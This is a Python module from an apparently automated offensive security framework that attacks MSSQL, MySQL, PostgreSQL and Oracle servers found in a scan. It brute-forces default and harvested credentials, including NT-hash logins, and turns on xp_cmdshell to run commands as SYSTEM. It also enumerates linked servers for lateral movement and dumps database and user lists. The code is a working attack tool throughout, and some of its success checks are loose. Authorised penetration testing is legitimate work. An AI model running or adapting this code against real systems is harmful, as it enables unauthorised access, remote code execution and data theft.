"""Database attacks: Oracle (1521), PostgreSQL (5432), MSSQL (1433), MySQL (3306).

Each database service discovered during the port scan is probed for weak /
default credentials and, where access is obtained, enumerated. MSSQL also
attempts xp_cmdshell RCE (SYSTEM) and linked-server chaining when sysadmin.
"""
from __future__ import annotations

import os
from pathlib import Path

from .base import BaseModule

DB_PORTS = {1433: "mssql", 3306: "mysql", 5432: "postgres", 1521: "oracle"}


class DatabaseModule(BaseModule):
    name = "database_attacks"
    description = "Attack Oracle, PostgreSQL, MSSQL and MySQL services"

    def run(self, workdir: Path) -> dict:
        if not self.config.get("database.enabled", True):
            return {}
        common_creds = self.config.get("database.common_credentials", [])
        found = 0

        for ip, host in self.state.hosts.items():
            for port, dbtype in DB_PORTS.items():
                if port not in host.ports:
                    continue
                if dbtype == "mssql":
                    found += self._mssql(ip)
                elif dbtype == "mysql":
                    found += self._mysql(ip, common_creds)
                elif dbtype == "postgres":
                    found += self._postgres(ip, common_creds)
                elif dbtype == "oracle":
                    found += self._oracle(ip, common_creds)
        return {"databases_pwned": found}

    # ------------------------------------------------------------------
    # MSSQL (1433)
    # ------------------------------------------------------------------
    def _mssql(self, ip: str) -> int:
        """Probe MSSQL: null session, then domain creds, then RCE + links."""
        pwned = 0
        # 1. Null / guest session
        res = self.runner.run(
            [self.nxc_bin(), "mssql", ip, "-u", "", "-p", ""],
            timeout=120, silent=True)
        if _nxc_mssql_ok(res):
            self.log_finding("high", "MSSQL null/guest session", f"{ip}:1433",
                             host=ip, technique="MSSQL Null Session")
            pwned += self._mssql_rce(ip, "", "")

        # 2. Domain credentials (Windows auth)
        for cred in self.state.usable_credentials():
            args = [self.nxc_bin(), "mssql", ip, "-u", cred.username]
            if cred.password:
                args += ["-p", cred.password]
            elif cred.nthash:
                args += ["-H", cred.nthash]
            if cred.domain:
                args += ["-d", cred.domain]
            res = self.runner.run(args, timeout=120, silent=True)
            if _nxc_mssql_ok(res):
                self.log_finding(
                    "high", "MSSQL access via domain creds",
                    f"{cred.username} is SQL admin on {ip}",
                    host=ip, technique="MSSQL")
                pwned += self._mssql_rce(ip, cred.username, cred.password)
        return pwned

    def _mssql_rce(self, ip: str, user: str, pwd: str) -> int:
        """If sysadmin, enable xp_cmdshell and run whoami (RCE as SYSTEM)."""
        if not self.config.get("database.mssql.enable_xp_cmdshell", True):
            return 0
        args = [self.nxc_bin(), "mssql", ip, "-u", user or "", "-p", pwd or "",
                "-x", "whoami"]
        res = self.runner.run(args, timeout=120, silent=True)
        if "nt authority" in res.stdout.lower() or "system" in res.stdout.lower():
            self.log_finding(
                "critical", "MSSQL command execution (SYSTEM)",
                f"xp_cmdshell on {ip} as {res.stdout.strip()[:80]}",
                host=ip, technique="MSSQL xp_cmdshell")
            return 1

        # Enumerate linked servers (chain across hosts)
        if self.config.get("database.mssql.enumerate_links", True):
            res = self.runner.run(
                [self.nxc_bin(), "mssql", ip, "-u", user or "", "-p", pwd or "",
                 "-q", "SELECT name, data_source FROM sys.servers"],
                timeout=120, silent=True)
            for line in res.out_lines:
                if "data_source" in line.lower() or "," in line:
                    self.log_finding("info", "MSSQL linked server", line.strip(),
                                     host=ip, technique="MSSQL Linked Server")
        return 0

    # ------------------------------------------------------------------
    # MySQL (3306)
    # ------------------------------------------------------------------
    def _mysql(self, ip: str, creds: list) -> int:
        mysql = self.runner.which("mysql")
        if not mysql:
            self.log.debug("mysql client not found; skipping MySQL")
            return 0
        for user, pwd in creds:
            cmd = [mysql, "-h", ip, "-u", user, "--connect-timeout=8",
                   "-e", "SELECT version();"]
            if pwd:
                cmd.insert(-2, f"-p{pwd}")
            res = self.runner.run(cmd, timeout=60, silent=True)
            if res.ok and "version()" in res.stdout:
                self.log_finding(
                    "critical", "MySQL credentials",
                    f"{ip}:3306 user={user or '(empty)'} pass={pwd or '(empty)'}",
                    host=ip, technique="MySQL")
                self._mysql_enumerate(mysql, ip, user, pwd)
                return 1
        return 0

    def _mysql_enumerate(self, mysql, ip, user, pwd) -> None:
        cmd = [mysql, "-h", ip, "-u", user]
        if pwd:
            cmd.append(f"-p{pwd}")
        cmd += ["-e", "SHOW DATABASES; SELECT user, host FROM mysql.user;"]
        res = self.runner.run(cmd, timeout=60, silent=True)
        for line in res.out_lines:
            if line and "Database" not in line and "user" not in line.lower():
                self.log_finding("info", "MySQL data", line.strip(),
                                 host=ip, technique="MySQL Enum")

    # ------------------------------------------------------------------
    # PostgreSQL (5432)
    # ------------------------------------------------------------------
    def _postgres(self, ip: str, creds: list) -> int:
        psql = self.runner.which("psql")
        if not psql:
            self.log.debug("psql not found; skipping PostgreSQL")
            return 0
        for user, pwd in creds:
            env = dict(os.environ)
            env["PGPASSWORD"] = pwd
            cmd = [psql, "-h", ip, "-U", user, "-w", "-tAc", "SELECT version();"]
            res = self.runner.run(cmd, timeout=60, silent=True)
            # runner doesn't accept env; re-run with subprocess env below
            res = self._run_with_env(cmd, env)
            if res.ok and "PostgreSQL" in res.stdout:
                self.log_finding(
                    "critical", "PostgreSQL credentials",
                    f"{ip}:5432 user={user} pass={pwd or '(empty)'}",
                    host=ip, technique="PostgreSQL")
                self._postgres_enumerate(psql, ip, user, pwd)
                return 1
        return 0

    def _postgres_enumerate(self, psql, ip, user, pwd) -> None:
        env = dict(os.environ)
        env["PGPASSWORD"] = pwd
        cmd = [psql, "-h", ip, "-U", user, "-w", "-tAc",
               "\\l", "-c", "SELECT current_user, version();"]
        res = self._run_with_env(cmd, env)
        for line in res.out_lines:
            if line.strip():
                self.log_finding("info", "PostgreSQL data", line.strip(),
                                 host=ip, technique="PostgreSQL Enum")

    def _run_with_env(self, cmd, env):
        """Run a command with a custom environment (for PGPASSWORD)."""
        import subprocess
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True,
                                  timeout=60, env=env)
            from core.runner import Result
            return Result([str(c) for c in cmd], proc.returncode,
                          proc.stdout, proc.stderr)
        except Exception:
            from core.runner import Result
            return Result([str(c) for c in cmd], -1, "", "")

    # ------------------------------------------------------------------
    # Oracle (1521)
    # ------------------------------------------------------------------
    def _oracle(self, ip: str, creds: list) -> int:
        odat = self.runner.which("odat")
        if not odat:
            self.log.debug("odat not found; skipping Oracle")
            return 0
        sids = self.config.get("database.oracle_sids", ["XE", "ORCL"])
        for sid in sids:
            for user, pwd in creds:
                if not user:
                    continue
                res = self.runner.run(
                    [odat, "dbmsversion", "-s", ip, "-p", "1521",
                     "-d", sid, "-U", user, "-P", pwd],
                    timeout=120, silent=True)
                if "OK" in res.stdout and "version" in res.stdout.lower():
                    self.log_finding(
                        "critical", "Oracle credentials",
                        f"{ip}:1521 SID={sid} user={user} pass={pwd}",
                        host=ip, technique="Oracle")
                    return 1
        return 0


def _nxc_mssql_ok(res) -> bool:
    """Determine whether an nxc mssql run succeeded (auth accepted)."""
    return res.returncode == 0 and ("mssql" in res.stdout.lower() or
                                    "Windows" in res.stdout or
                                    res.stdout.strip() != "")
